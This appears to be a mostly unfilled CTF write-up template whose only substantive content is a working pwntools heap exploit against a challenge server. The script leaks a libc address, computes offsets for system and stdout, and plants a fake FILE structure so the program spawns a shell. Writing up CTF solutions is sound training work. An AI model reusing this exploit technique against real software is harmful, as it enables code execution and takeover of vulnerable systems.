# Challenge Name - CTF Name
## Challenge Info
- Date: YYYY-MM-DD
- CTF Name:
- Category: web/pwn/rev/crypto/forensic/osint/misc
- Difficulty (subjective): easy/medium/hard
- Points:
- Provided Files:
- tools:
## Brief Description
## Initial Analysis
### Environment
### Code
## Vulnerability
## Exploit
### Strategy
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

#r = process("./prob")
r = remote("3.35.12.237", 12345)

def register(ip, info, status):
    r.sendlineafter(">> ", "1")
    r.sendafter("address: ", ip)
    r.sendafter("info: ", info)
    r.sendlineafter("): ", str(status))

def update(idx, ip, info):
    r.sendlineafter(">> ", "2")
    r.sendlineafter("update: ", str(idx))
    r.sendafter("address: ", ip)
    r.sendafter("info: ", info)

def free():
    r.sendlineafter(">> ", "4")

def end():
    r.sendlineafter("...", "5")

register("Sechack", "Sechack", 1)
free()
end()
free()
end()
register("Sechack", b"\x20", 1)
free()

r.recvuntil("info : ")
libc = u64(r.recvn(6).ljust(8, b"\x00"))
libc_base = libc - 0x203b20
stdout = libc_base + 0x2045c0
wfile = libc_base + 0x202228
buf = libc_base + 0x204643
lock = libc_base + 0x205710
system = libc_base + 0x58750
log.info(hex(libc))

end()

r.sendlineafter(">> ", "3")
r.sendlineafter(">> ", "1")
r.sendafter("payload :", p64(buf)+p64(stdout)+p64(1))

fake = b"\x01\x01\x01\x01;sh;"
fake += p64(0)
fake += p64(buf)*2
fake += p64(0)*2
fake += p64(0)*7
fake += p64(system)
fake += p64(1)
fake += p64(0xffffffffffffffff)
fake += p64(0)
fake += p64(lock)
fake += p64(0xffffffffffffffff)
fake += p64(0)
fake += p64(stdout-0x10)
fake += p64(0)*3
fake += p64(0xffffffff)
fake += p64(0)
fake += p64(stdout)
fake += p64(wfile - 0X20)

update(1, "Sechack", fake)

r.interactive()
```